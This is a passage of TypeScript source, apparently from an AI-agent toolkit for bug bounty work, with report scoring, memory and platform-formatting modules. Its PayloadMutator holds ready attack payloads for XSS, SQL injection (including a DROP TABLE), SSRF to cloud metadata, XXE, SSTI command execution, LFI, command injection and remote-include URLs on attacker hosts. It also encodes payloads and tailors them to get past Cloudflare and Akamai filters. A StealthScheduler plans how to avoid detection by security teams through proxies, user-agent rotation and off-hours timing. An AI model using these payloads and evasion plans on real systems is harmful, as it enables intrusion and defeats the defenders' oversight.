    if (/\b(version|v\d)\b/i.test(desc)) score += 1;
    if (desc.includes('\n')) score += 1;
    return Math.min(score, 20);
  }

  private getDescriptionFeedback(score: number, desc: string): string {
    if (score >= 16) return 'Excellent description with technical detail';
    if (score >= 10) return 'Good description. Consider adding HTTP request/response examples and more technical specifics.';
    return 'Description needs more detail. Include affected parameters, request examples, and technical context.';
  }

  private scoreSteps(steps: string): number {
    let score = 0;
    const numberedSteps = (steps.match(/^\s*\d+[\.\)]/gm) || []).length;
    if (numberedSteps >= 2) score += 5;
    if (numberedSteps >= 4) score += 3;
    if (steps.length >= 100) score += 3;
    if (/\b(navigate|click|enter|submit|intercept|observe|send)\b/i.test(steps)) score += 3;
    if (/\b(url|request|parameter|payload)\b/i.test(steps)) score += 3;
    if (/```/.test(steps)) score += 3;
    return Math.min(score, 20);
  }

  private getStepsFeedback(score: number): string {
    if (score >= 16) return 'Steps are clear and detailed enough for reproduction';
    if (score >= 10) return 'Steps are adequate. Consider adding specific URLs, parameter values, and expected vs actual results.';
    return 'Steps need improvement. Use numbered steps with specific actions, URLs, and payloads.';
  }

  private scorePoc(poc: string): number {
    let score = 0;
    if (poc.length >= 50) score += 3;
    if (poc.length >= 200) score += 3;
    if (/```[\s\S]*?```/.test(poc)) score += 4;
    if (/\b(screenshot|image|video)\b/i.test(poc)) score += 3;
    if (/\b(curl|http|request|response)\b/i.test(poc)) score += 3;
    if (/\b(script|payload|exploit)\b/i.test(poc)) score += 2;
    if (/\b(result|output|response)\b/i.test(poc)) score += 2;
    return Math.min(score, 20);
  }

  private getPocFeedback(score: number): string {
    if (score >= 16) return 'Comprehensive PoC with evidence';
    if (score >= 10) return 'Decent PoC. Consider adding curl commands, full HTTP requests/responses, or a video walkthrough.';
    return 'PoC needs more evidence. Include working exploit code, screenshots, or HTTP request/response pairs.';
  }

  private scoreImpact(impact: string): number {
    let score = 0;
    if (impact.length >= 50) score += 3;
    if (impact.length >= 150) score += 3;
    if (/\b(data|leak|exfiltrat|breach|exposure|compromise)\b/i.test(impact)) score += 3;
    if (/\b(user|customer|admin|account)\b/i.test(impact)) score += 2;
    if (/\b(confidentiality|integrity|availability)\b/i.test(impact)) score += 2;
    if (/\b(all users|any user|organization)\b/i.test(impact)) score += 2;
    return Math.min(score, 15);
  }

  private getImpactFeedback(score: number): string {
    if (score >= 12) return 'Impact clearly articulates business and security risk';
    if (score >= 7) return 'Impact description is okay. Quantify the affected scope (number of users, data types at risk).';
    return 'Impact description is weak. Describe who is affected, what data is at risk, and the worst-case scenario.';
  }

  private scoreCvss(score: number, vector: string, severity?: string): number {
    let s = 0;
    if (vector && vector.startsWith('CVSS:3')) s += 4;
    if (score >= 0 && score <= 10) s += 2;
    if (severity) {
      const expected = this.cvssToSeverity(score);
      if (expected === severity.toLowerCase()) s += 4;
      else s += 1;
    }
    return Math.min(s, 10);
  }

  private getCvssFeedback(score: number): string {
    if (score >= 8) return 'CVSS scoring looks accurate and well-justified';
    if (score >= 4) return 'CVSS is present but may need adjustment. Verify the vector string matches the actual impact.';
    return 'Add a CVSS v3.1 vector string with proper scoring justification.';
  }

  private scoreRemediation(rem: string): number {
    let score = 0;
    if (rem.length >= 30) score += 2;
    if (rem.length >= 100) score += 1;
    if (/\b(sanitize|validate|encode|escape|filter|restrict|limit)\b/i.test(rem)) score += 1;
    if (/\b(CSP|WAF|CORS|SOP|HSTS)\b/i.test(rem)) score += 1;
    return Math.min(score, 5);
  }

  // ============================================================
  // 5. OrgMemory
  // ============================================================

  async storeOrgMemory(program: string, knowledge: Partial<ProgramKnowledge>): Promise<void> {
    this.emit('agent:start', { agent: 'org-memory', action: 'store', program });
    await this.ensureStorageDir();

    const existing = await this.loadJson<Record<string, OrgMemoryEntry>>('org-memory.json', {});
    const current = existing[program]?.data || {
      pastSubmissions: [],
      acceptedPatterns: [],
      rejectedPatterns: [],
      preferences: {},
      technologyStack: [],
      responseTime: 0,
      averagePayout: 0,
      notes: [],
    };

    if (knowledge.pastSubmissions) current.pastSubmissions.push(...knowledge.pastSubmissions);
    if (knowledge.acceptedPatterns) current.acceptedPatterns.push(...knowledge.acceptedPatterns);
    if (knowledge.rejectedPatterns) current.rejectedPatterns.push(...knowledge.rejectedPatterns);
    if (knowledge.preferences) Object.assign(current.preferences, knowledge.preferences);
    if (knowledge.technologyStack) {
      const techArr = [...current.technologyStack, ...knowledge.technologyStack];
      current.technologyStack = techArr.filter((v, i, a) => a.indexOf(v) === i);
    }
    if (knowledge.responseTime) current.responseTime = knowledge.responseTime;
    if (knowledge.averagePayout) current.averagePayout = knowledge.averagePayout;
    if (knowledge.notes) current.notes.push(...knowledge.notes);

    existing[program] = { program, data: current, updatedAt: Date.now() };
    await this.saveJson('org-memory.json', existing);

    this.recordRun('org-memory', true);
    this.emit('agent:complete', { agent: 'org-memory', action: 'store', program });
  }

  async retrieveOrgMemory(program: string): Promise<ProgramKnowledge | null> {
    this.emit('agent:start', { agent: 'org-memory', action: 'retrieve', program });

    const existing = await this.loadJson<Record<string, OrgMemoryEntry>>('org-memory.json', {});
    const entry = existing[program];

    this.recordRun('org-memory', true);
    this.emit('agent:complete', { agent: 'org-memory', action: 'retrieve', program, found: !!entry });

    return entry?.data || null;
  }

  async listPrograms(): Promise<string[]> {
    const existing = await this.loadJson<Record<string, OrgMemoryEntry>>('org-memory.json', {});
    return Object.keys(existing);
  }

  // ============================================================
  // 6. PayloadMutator
  // ============================================================

  async mutatePayloads(context: {
    category: 'xss' | 'sqli' | 'ssrf' | 'xxe' | 'ssti' | 'lfi' | 'rfi' | 'cmdi';
    basePayload?: string;
    wafType?: string;
    encodingPreferences?: string[];
    maxVariants?: number;
  }): Promise<PayloadMutationResult> {
    this.emit('agent:start', { agent: 'payload-mutator', context });

    const basePayloads: Record<string, string[]> = {
      xss: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(document.domain)</script>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
      ],
      sqli: [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL--",
        "1' AND (SELECT SUBSTRING(version(),1,1))='5'--",
        "admin'--",
        "' OR '1'='1",
        "1; DROP TABLE users--",
      ],
      ssrf: [
        'http://127.0.0.1',
        'http://localhost',
        'http://[::1]',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/',
        'file:///etc/passwd',
      ],
      xxe: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]>',
      ],
      ssti: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{self.__init__.__globals__}}',
        '{%import os%}{{os.popen("id").read()}}',
      ],
      lfi: [
        '../../etc/passwd',
        '....//....//etc/passwd',
        '/etc/passwd%00',
        '..%2f..%2f..%2fetc%2fpasswd',
        'php://filter/convert.base64-encode/resource=index.php',
        '/proc/self/environ',
      ],
      rfi: [
        'http://evil.com/shell.txt',
        'https://attacker.com/payload.php',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
      ],
      cmdi: [
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '\nid\n',
      ],
    };

    const originals = context.basePayload
      ? [context.basePayload]
      : basePayloads[context.category] || basePayloads.xss;

    const original = originals[0];
    const maxVariants = context.maxVariants || 20;
    const variants: PayloadVariant[] = [];

    for (const base of originals) {
      if (variants.length >= maxVariants) break;

      variants.push({
        payload: base,
        encoding: 'none',
        bypassTarget: 'none',
        evasionLevel: 1,
        description: 'Original payload',
      });

      const urlEncoded = encodeURIComponent(base);
      variants.push({
        payload: urlEncoded,
        encoding: 'url',
        bypassTarget: 'url-decode-filter',
        evasionLevel: 2,
        description: 'URL-encoded variant',
      });

      const doubleUrlEncoded = encodeURIComponent(urlEncoded);
      variants.push({
        payload: doubleUrlEncoded,
        encoding: 'double-url',
        bypassTarget: 'double-decode-filter',
        evasionLevel: 3,
        description: 'Double URL-encoded to bypass single-decode filters',
      });

      const base64Encoded = Buffer.from(base).toString('base64');
      variants.push({
        payload: base64Encoded,
        encoding: 'base64',
        bypassTarget: 'pattern-match-filter',
        evasionLevel: 2,
        description: 'Base64-encoded to evade pattern matching',
      });

      const hexEncoded = Buffer.from(base).toString('hex').replace(/../g, '%$&');
      variants.push({
        payload: hexEncoded,
        encoding: 'hex',
        bypassTarget: 'string-match-filter',
        evasionLevel: 3,
        description: 'Hex-encoded variant',
      });

      if (variants.length >= maxVariants) break;
    }

    if (context.category === 'xss') {
      const xssEvasions = this.generateXssEvasions(context.wafType);
      for (const ev of xssEvasions) {
        if (variants.length >= maxVariants) break;
        variants.push(ev);
      }
    }

    if (context.category === 'sqli') {
      const sqliEvasions = this.generateSqliEvasions(context.wafType);
      for (const ev of sqliEvasions) {
        if (variants.length >= maxVariants) break;
        variants.push(ev);
      }
    }

    if (context.category === 'ssrf') {
      const ssrfEvasions = this.generateSsrfEvasions();
      for (const ev of ssrfEvasions) {
        if (variants.length >= maxVariants) break;
        variants.push(ev);
      }
    }

    const result: PayloadMutationResult = {
      original,
      category: context.category,
      variants: variants.slice(0, maxVariants),
      totalVariants: variants.length,
      confidence: 0.8,
    };

    this.recordRun('payload-mutator', true);
    this.emit('agent:complete', { agent: 'payload-mutator', result: { category: context.category, totalVariants: result.totalVariants } });
    return result;
  }

  private generateXssEvasions(wafType?: string): PayloadVariant[] {
    const evasions: PayloadVariant[] = [
      { payload: '<ScRiPt>alert(1)</ScRiPt>', encoding: 'mixed-case', bypassTarget: 'case-sensitive-filter', evasionLevel: 2, description: 'Mixed case to bypass case-sensitive filters' },
      { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', encoding: 'nested-tags', bypassTarget: 'single-pass-strip', evasionLevel: 3, description: 'Nested tags to bypass single-pass tag stripping' },
      { payload: '<img src=x onerror="&#x61;lert(1)">', encoding: 'html-entity', bypassTarget: 'keyword-filter', evasionLevel: 3, description: 'HTML entity encoding in event handler' },
      { payload: '<svg/onload=alert(1)>', encoding: 'no-space', bypassTarget: 'space-required-filter', evasionLevel: 2, description: 'SVG without spaces' },
      { payload: 'javascript:alert(1)', encoding: 'protocol', bypassTarget: 'tag-filter', evasionLevel: 2, description: 'JavaScript protocol handler' },
      { payload: '<img src=x onerror=alert`1`>', encoding: 'template-literal', bypassTarget: 'parentheses-filter', evasionLevel: 3, description: 'Template literal to bypass parentheses filter' },
      { payload: '<iframe srcdoc="<script>alert(1)</script>">', encoding: 'srcdoc', bypassTarget: 'script-tag-filter', evasionLevel: 4, description: 'srcdoc iframe to embed script in attribute' },
      { payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', encoding: 'dom-clobbering', bypassTarget: 'sanitizer', evasionLevel: 5, description: 'DOM clobbering with math/table namespace confusion' },
    ];

    if (wafType === 'cloudflare') {
      evasions.push(
        { payload: '<a/href="j%0aavascript:alert(1)">click', encoding: 'newline-inject', bypassTarget: 'cloudflare', evasionLevel: 4, description: 'Newline injection in protocol for Cloudflare bypass' },
        { payload: '<details/open/ontoggle=self["al"+"ert"](1)>', encoding: 'string-concat', bypassTarget: 'cloudflare', evasionLevel: 4, description: 'String concatenation to evade keyword detection' },
      );
    }

    if (wafType === 'akamai') {
      evasions.push(
        { payload: '<svg><animate onbegin=alert(1) attributeName=x>', encoding: 'animate', bypassTarget: 'akamai', evasionLevel: 4, description: 'SVG animate event handler for Akamai bypass' },
      );
    }

    return evasions;
  }

  private generateSqliEvasions(wafType?: string): PayloadVariant[] {
    return [
      { payload: "' /*!50000OR*/ 1=1--", encoding: 'mysql-comment', bypassTarget: 'keyword-filter', evasionLevel: 3, description: 'MySQL versioned comment to bypass OR keyword filter' },
      { payload: "' %4fR 1=1--", encoding: 'hex-keyword', bypassTarget: 'keyword-filter', evasionLevel: 3, description: 'Hex-encoded keyword' },
      { payload: "'+OR+1=1--", encoding: 'plus-space', bypassTarget: 'space-filter', evasionLevel: 2, description: 'Plus sign instead of spaces' },
      { payload: "'/**/OR/**/1=1--", encoding: 'comment-space', bypassTarget: 'space-filter', evasionLevel: 3, description: 'SQL comments as whitespace' },
      { payload: "' UNION/**/SELECT/**/NULL,NULL--", encoding: 'comment-bypass', bypassTarget: 'union-filter', evasionLevel: 3, description: 'Comment-based UNION bypass' },
      { payload: "' UniOn SeLeCt NULL,NULL--", encoding: 'mixed-case', bypassTarget: 'case-sensitive-filter', evasionLevel: 2, description: 'Mixed case SQL keywords' },
      { payload: "'-1' UNION SELECT 1,2,3--", encoding: 'numeric-union', bypassTarget: 'string-filter', evasionLevel: 2, description: 'Numeric UNION injection' },
      { payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", encoding: 'error-based', bypassTarget: 'blind-only-filter', evasionLevel: 4, description: 'Error-based extraction via CONVERT' },
    ];
  }

  private generateSsrfEvasions(): PayloadVariant[] {
    return [
      { payload: 'http://0x7f000001', encoding: 'hex-ip', bypassTarget: 'ip-blocklist', evasionLevel: 3, description: 'Hexadecimal IP representation' },
      { payload: 'http://2130706433', encoding: 'decimal-ip', bypassTarget: 'ip-blocklist', evasionLevel: 3, description: 'Decimal IP representation of 127.0.0.1' },
      { payload: 'http://0177.0.0.1', encoding: 'octal-ip', bypassTarget: 'ip-blocklist', evasionLevel: 3, description: 'Octal IP representation' },
      { payload: 'http://127.1', encoding: 'short-ip', bypassTarget: 'ip-blocklist', evasionLevel: 2, description: 'Shortened IP notation' },
      { payload: 'http://[::ffff:127.0.0.1]', encoding: 'ipv6-mapped', bypassTarget: 'ipv4-only-filter', evasionLevel: 3, description: 'IPv6 mapped IPv4 address' },
      { payload: 'http://localtest.me', encoding: 'dns-rebinding', bypassTarget: 'hostname-filter', evasionLevel: 4, description: 'DNS name that resolves to 127.0.0.1' },
      { payload: 'http://spoofed.burpcollaborator.net', encoding: 'oob', bypassTarget: 'response-filter', evasionLevel: 3, description: 'Out-of-band detection via external collaborator' },
      { payload: 'gopher://127.0.0.1:6379/_INFO', encoding: 'gopher', bypassTarget: 'http-only-filter', evasionLevel: 4, description: 'Gopher protocol to reach internal services' },
    ];
  }

  // ============================================================
  // 7. StealthScheduler
  // ============================================================

  async planStealth(config: {
    totalRequests: number;
    targetDomain: string;
    aggressiveness?: 'low' | 'medium' | 'high';
    preferredTimezone?: string;
    durationHours?: number;
  }): Promise<StealthPlan> {
    this.emit('agent:start', { agent: 'stealth-scheduler', config });

    const aggressiveness = config.aggressiveness || 'medium';
    const durationHours = config.durationHours || (aggressiveness === 'low' ? 48 : aggressiveness === 'medium' ? 24 : 8);

    const rateProfiles: Record<string, { requestsPerMinute: number; cooldownMinutes: number; riskScore: number }> = {
      low: { requestsPerMinute: 1, cooldownMinutes: 15, riskScore: 0.15 },
      medium: { requestsPerMinute: 5, cooldownMinutes: 5, riskScore: 0.4 },
      high: { requestsPerMinute: 20, cooldownMinutes: 2, riskScore: 0.75 },
    };

    const profile = rateProfiles[aggressiveness];

    const optimalHours = [1, 2, 3, 4, 5, 6, 22, 23];
    const acceptableHours = [7, 8, 9, 10, 11, 12, 13, 14, 20, 21];

    const windows: ActivityWindow[] = [];
    const now = new Date();
    let remainingRequests = config.totalRequests;
    let currentHour = now.getHours();

    for (let i = 0; i < Math.ceil(durationHours / 2) && remainingRequests > 0; i++) {
      const windowStart = new Date(now.getTime() + i * 2 * 60 * 60 * 1000);
      const windowEnd = new Date(windowStart.getTime() + 2 * 60 * 60 * 1000);
      const hour = (currentHour + i * 2) % 24;

      let riskLevel: 'low' | 'medium' | 'high';
      let maxReq: number;

      if (optimalHours.includes(hour)) {
        riskLevel = 'low';
        maxReq = Math.min(remainingRequests, profile.requestsPerMinute * 120);
      } else if (acceptableHours.includes(hour)) {
        riskLevel = 'medium';
        maxReq = Math.min(remainingRequests, profile.requestsPerMinute * 60);
      } else {
        riskLevel = 'high';
        maxReq = Math.min(remainingRequests, profile.requestsPerMinute * 30);
      }

      windows.push({
        start: windowStart.toISOString(),
        end: windowEnd.toISOString(),
        maxRequests: maxReq,
        riskLevel,
        description: `${riskLevel === 'low' ? 'Optimal' : riskLevel === 'medium' ? 'Acceptable' : 'Risky'} window - ${hour}:00-${(hour + 2) % 24}:00`,
      });

      remainingRequests -= maxReq;
    }

    const requestsPerWindow = Math.ceil(config.totalRequests / Math.max(windows.length, 1));

    const recommendations: string[] = [
      `Spread ${config.totalRequests} requests over ${windows.length} windows across ${durationHours} hours`,
      `Use randomized delays between ${profile.cooldownMinutes * 0.5}s and ${profile.cooldownMinutes * 2}s between requests`,
      'Rotate User-Agent strings for each request batch',
      'Use different source IPs or proxy chains if available',
      `Avoid peak hours (15:00-19:00) when SOC teams are most active`,
      'Randomize request ordering to avoid sequential pattern detection',
      'Mix legitimate-looking requests with test payloads',
    ];

    if (aggressiveness === 'low') {
      recommendations.push('Consider using residential proxies for lower detection risk');
      recommendations.push('Add jitter (random delays) between 5-30 seconds');
    }

    const result: StealthPlan = {
      windows,
      optimalHours,
      detectionRiskScore: profile.riskScore,
      requestsPerWindow,
      cooldownMinutes: profile.cooldownMinutes,
      totalDurationHours: durationHours,
      recommendations,
      confidence: 0.75,
    };

    this.recordRun('stealth-scheduler', true);
    this.emit('agent:complete', { agent: 'stealth-scheduler', result: { riskScore: result.detectionRiskScore, windows: windows.length } });
    return result;
  }

  // ============================================================
  // 8. SubmissionOptimizer
  // ============================================================

  async optimizeSubmission(report: {
    title: string;
    description: string;
    severity: string;
    vulnerabilityType: string;
    stepsToReproduce: string;
    impact: string;
    proofOfConcept?: string;
    remediation?: string;
    affectedEndpoint: string;
    platform: 'hackerone' | 'bugcrowd' | 'intigriti' | 'synack' | 'yeswehack' | 'generic';
  }): Promise<OptimizedSubmission> {
    this.emit('agent:start', { agent: 'submission-optimizer', platform: report.platform });

    const cvssScore = this.estimateCvssFromType(report.vulnerabilityType, report.severity);
    const cvssVector = this.generateCvssVector(report.vulnerabilityType, report.severity);

    const platformFormatters: Record<string, (r: typeof report) => { title: string; body: string; fields: Record<string, any>; tags: string[] }> = {
      hackerone: (r) => ({
        title: this.formatHackerOneTitle(r),
        body: this.formatHackerOneBody(r),
        fields: {
          weakness: this.mapToHackerOneWeakness(r.vulnerabilityType),
          structured_scope: r.affectedEndpoint,
          severity_rating: r.severity.toLowerCase(),
          impact: r.impact,
        },
        tags: this.getHackerOneTags(r.vulnerabilityType),
      }),

      bugcrowd: (r) => ({
        title: this.formatBugcrowdTitle(r),
        body: this.formatBugcrowdBody(r),
        fields: {
          vrt: this.mapToBugcrowdVRT(r.vulnerabilityType),
          priority: this.mapToBugcrowdPriority(r.severity),
          target: r.affectedEndpoint,
          cwe: this.mapToCWE(r.vulnerabilityType),
        },
        tags: this.getBugcrowdTags(r.vulnerabilityType),
      }),

      intigriti: (r) => ({
        title: this.formatIntigritiTitle(r),
        body: this.formatIntigritiBody(r),
        fields: {
          severity: r.severity.toUpperCase(),
          domain: r.affectedEndpoint,
          type: r.vulnerabilityType,
          cvss_score: cvssScore,
          cvss_vector: cvssVector,
        },
        tags: this.getIntigritiTags(r.vulnerabilityType),
      }),

      synack: (r) => ({
        title: this.formatSynackTitle(r),
        body: this.formatSynackBody(r),
        fields: {
          category: this.mapToSynackCategory(r.vulnerabilityType),
          severity: this.mapToSynackSeverity(r.severity),
          cvss_score: cvssScore,
          cvss_vector: cvssVector,
          cwe: this.mapToCWE(r.vulnerabilityType),
          affected_asset: r.affectedEndpoint,
          exploitability: this.getSynackExploitability(r.vulnerabilityType),
        },
        tags: this.getSynackTags(r.vulnerabilityType),
      }),

      yeswehack: (r) => ({
        title: this.formatYesWeHackTitle(r),
        body: this.formatYesWeHackBody(r),
        fields: {
          scope: r.affectedEndpoint,
          end_point: r.affectedEndpoint,
          vulnerable_part: this.getYesWeHackVulnerablePart(r.vulnerabilityType),
          severity: r.severity.toLowerCase(),
          cvss_score: cvssScore,
          cvss_vector: cvssVector,
          cwe: this.mapToCWE(r.vulnerabilityType),
          owasp_category: this.mapToOWASP(r.vulnerabilityType),
        },
        tags: this.getYesWeHackTags(r.vulnerabilityType),
      }),

      generic: (r) => ({
        title: `[${r.severity.toUpperCase()}] ${r.vulnerabilityType} in ${r.affectedEndpoint}`,
        body: this.formatGenericBody(r),
        fields: {},
        tags: [r.vulnerabilityType, r.severity],
      }),
    };

    const formatter = platformFormatters[report.platform] || platformFormatters.generic;
    const formatted = formatter(report);

    const result: OptimizedSubmission = {
      platform: report.platform,
      formattedTitle: formatted.title,
      formattedBody: formatted.body,
      severity: report.severity,
      cvssVector,
      cvssScore,
      platformSpecificFields: formatted.fields,
      tags: formatted.tags,
      confidence: 0.8,
    };

    this.recordRun('submission-optimizer', true);
    this.emit('agent:complete', { agent: 'submission-optimizer', platform: report.platform });
    return result;
  }

  private formatHackerOneTitle(r: any): string {
    return `[${r.severity}] ${r.vulnerabilityType} in ${r.affectedEndpoint} allows ${this.getImpactVerb(r.vulnerabilityType)}`;
  }

  private formatHackerOneBody(r: any): string {
    let body = `## Summary\n${r.description}\n\n`;
    body += `## Steps To Reproduce\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `## Supporting Material/References\n${r.proofOfConcept}\n\n`;
    body += `## Impact\n${r.impact}\n\n`;
    if (r.remediation) body += `## Recommended Fix\n${r.remediation}\n`;
    return body;
  }

  private formatBugcrowdTitle(r: any): string {
    return `${r.vulnerabilityType} - ${r.affectedEndpoint}`;
  }

  private formatBugcrowdBody(r: any): string {
    let body = `**URL / Location:** ${r.affectedEndpoint}\n\n`;
    body += `**Description:**\n${r.description}\n\n`;
    body += `**Steps to Reproduce:**\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `**Proof of Concept:**\n${r.proofOfConcept}\n\n`;
    body += `**Impact:**\n${r.impact}\n\n`;
    if (r.remediation) body += `**Suggested Remediation:**\n${r.remediation}\n`;
    return body;
  }

  private formatIntigritiTitle(r: any): string {
    return `${r.vulnerabilityType} on ${r.affectedEndpoint}`;
  }

  private formatIntigritiBody(r: any): string {
    let body = `### Domain/URL\n${r.affectedEndpoint}\n\n`;
    body += `### Description\n${r.description}\n\n`;
    body += `### Steps to reproduce\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `### Proof of Concept\n${r.proofOfConcept}\n\n`;
    body += `### Expected behaviour vs Actual behaviour\nExpected: Secure handling\nActual: ${r.impact}\n\n`;
    if (r.remediation) body += `### Remediation\n${r.remediation}\n`;
    return body;
  }

  private formatGenericBody(r: any): string {
    let body = `# Vulnerability Report\n\n`;
    body += `**Type:** ${r.vulnerabilityType}\n`;
    body += `**Severity:** ${r.severity}\n`;
    body += `**Affected Endpoint:** ${r.affectedEndpoint}\n\n`;
    body += `## Description\n${r.description}\n\n`;
    body += `## Steps to Reproduce\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `## Proof of Concept\n${r.proofOfConcept}\n\n`;
    body += `## Impact\n${r.impact}\n\n`;
    if (r.remediation) body += `## Remediation\n${r.remediation}\n`;
    return body;
  }

  private generateCvssVector(vulnType: string, severity: string): string {
    const baseVectors: Record<string, string> = {
      rce: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
      sqli: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      xss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
      ssrf: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
      xxe: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      idor: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
      csrf: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N',
      auth_bypass: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      privilege_escalation: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
      account_takeover: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      open_redirect: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N',
      info_disclosure: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
      ssti: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      lfi: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      path_traversal: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      cmdi: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    };
    const key = vulnType.toLowerCase().replace(/[\s-]/g, '_');
    return baseVectors[key] || 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N';
  }

  private mapToHackerOneWeakness(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'Cross-site Scripting (XSS) - Reflected',
      sqli: 'SQL Injection',
      ssrf: 'Server-Side Request Forgery (SSRF)',
      idor: 'Insecure Direct Object Reference (IDOR)',
      csrf: 'Cross-Site Request Forgery (CSRF)',
      xxe: 'XML External Entities (XXE)',
      rce: 'Remote Code Execution (RCE)',
      auth_bypass: 'Authentication Bypass Using an Alternate Path or Channel',
      open_redirect: 'Open Redirect',
      info_disclosure: 'Information Disclosure',
      privilege_escalation: 'Privilege Escalation',
      account_takeover: 'Account Takeover',
      ssti: 'Server-Side Template Injection (SSTI)',
      lfi: 'Path Traversal - Local File Inclusion (LFI)',
      path_traversal: 'Path Traversal',
      cmdi: 'OS Command Injection',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || vulnType;
  }

  private mapToBugcrowdVRT(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'cross_site_scripting_xss.reflected',
      sqli: 'server_security_misconfiguration.sql_injection',
      ssrf: 'server_side_request_forgery',
      idor: 'broken_access_control.idor',
      csrf: 'cross_site_request_forgery',
      xxe: 'server_security_misconfiguration.xxe',
      rce: 'server_security_misconfiguration.remote_code_execution',
      auth_bypass: 'broken_authentication_and_session_management.authentication_bypass',
      privilege_escalation: 'broken_access_control.privilege_escalation',
      account_takeover: 'broken_authentication_and_session_management.account_takeover',
      open_redirect: 'unvalidated_redirects_and_forwards.open_redirect',
      info_disclosure: 'sensitive_data_exposure.information_disclosure',
      ssti: 'server_security_misconfiguration.template_injection',
      lfi: 'server_security_misconfiguration.local_file_inclusion',
      path_traversal: 'server_security_misconfiguration.path_traversal',
      cmdi: 'server_security_misconfiguration.os_command_injection',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'other';
  }

  private mapToBugcrowdPriority(severity: string): number {
    const map: Record<string, number> = { critical: 1, high: 2, medium: 3, low: 4, informational: 5 };
    return map[severity.toLowerCase()] || 3;
  }

  private mapToCWE(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'CWE-79', sqli: 'CWE-89', ssrf: 'CWE-918', idor: 'CWE-639',
      csrf: 'CWE-352', xxe: 'CWE-611', rce: 'CWE-94', auth_bypass: 'CWE-287',
      open_redirect: 'CWE-601', info_disclosure: 'CWE-200', lfi: 'CWE-98',
      ssti: 'CWE-1336', path_traversal: 'CWE-22', cmdi: 'CWE-78',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'CWE-Other';
  }

  private getHackerOneTags(vulnType: string): string[] {
    return [vulnType.toLowerCase(), 'web', 'application-security'];
  }

  private getBugcrowdTags(vulnType: string): string[] {
    return [vulnType.toLowerCase(), 'webapp'];
  }

  private getIntigritiTags(vulnType: string): string[] {
    return [vulnType.toLowerCase(), 'web-application'];
  }

  private formatSynackTitle(r: any): string {
    return `${r.vulnerabilityType} - ${r.affectedEndpoint} [${r.severity.toUpperCase()}]`;
  }

  private formatSynackBody(r: any): string {
    let body = `## Vulnerability Overview\n\n`;
    body += `**Asset:** ${r.affectedEndpoint}\n`;
    body += `**Category:** ${r.vulnerabilityType}\n`;
    body += `**Severity:** ${r.severity}\n\n`;
    body += `## Description\n${r.description}\n\n`;
    body += `## Proof of Concept\n\n`;
    body += `### Steps to Reproduce\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `### Evidence\n${r.proofOfConcept}\n\n`;
    body += `## Impact Assessment\n${r.impact}\n\n`;
    body += `## CVSS Information\n`;
    body += `- **Score:** Calculated based on vulnerability type\n`;
    body += `- **Vector:** See platform-specific fields\n\n`;
    if (r.remediation) body += `## Recommended Remediation\n${r.remediation}\n\n`;
    body += `## SRT Notes\n`;
    body += `- Finding discovered during authorized Synack Red Team engagement\n`;
    body += `- All testing conducted through LaunchPoint VPN\n`;
    body += `- Testing confined to in-scope assets only\n`;
    return body;
  }

  private mapToSynackCategory(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'Cross-Site Scripting',
      sqli: 'SQL Injection',
      ssrf: 'Server-Side Request Forgery',
      idor: 'Broken Access Control',
      csrf: 'Cross-Site Request Forgery',
      xxe: 'XML External Entity',
      rce: 'Remote Code Execution',
      auth_bypass: 'Broken Authentication',
